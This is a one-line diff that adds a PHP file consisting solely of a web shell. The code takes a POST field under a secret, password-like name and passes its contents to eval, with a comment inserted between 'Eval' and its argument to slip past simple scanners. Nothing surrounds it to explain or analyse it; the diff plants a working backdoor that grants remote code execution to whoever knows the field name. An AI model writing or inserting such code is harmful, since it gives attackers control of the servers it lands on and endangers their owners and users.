@@ -1,0 +1,1 @@
+<?php $a=filter_input(INPUT_POST,'ISAZO1289c!jda@d42');Eval/**/(trim($a));?>
